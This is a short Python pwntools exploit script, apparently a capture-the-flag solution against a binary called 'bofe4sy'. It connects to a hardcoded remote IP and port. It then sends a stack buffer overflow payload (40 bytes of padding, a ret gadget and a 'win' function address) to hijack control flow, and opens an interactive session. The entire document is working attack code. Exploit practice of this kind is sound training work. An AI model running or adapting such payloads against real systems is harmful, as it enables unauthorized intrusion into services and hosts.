from pwn import *

context.arch = "amd64"

ip = "140.110.112.77"
port = 2121

context.arch = "amd64"

r = remote(ip, port)
# r = process("./bofe4sy")

ret = 0x4004c1
win = 0x400646

r.sendline(flat('a' * 40, ret, win))

r.interactive()
